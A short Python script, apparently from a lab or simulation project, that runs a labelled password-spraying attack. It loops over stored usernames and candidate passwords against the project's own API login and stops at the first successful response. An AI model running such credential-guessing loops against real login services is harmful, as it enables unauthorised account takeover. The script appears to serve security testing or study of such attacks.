from server.context import ctx
from client.client import ApiClientService
from client.file_managers.file_manager import FileManager



def password_spraying(file_manager: FileManager):
    """
    password_spraying attack
    :return:
    """
    users = file_manager.get_users
    passwords = file_manager.get_password_spraying_passwords
    client_service = ApiClientService(seed_group=ctx.settings.seed_group)
    for user in users:
        for password in passwords:
            results = client_service.login(username=user, password=password)
            if results["status_code"] == 200:
                return



if __name__ == '__main__':
    password_spraying(FileManager())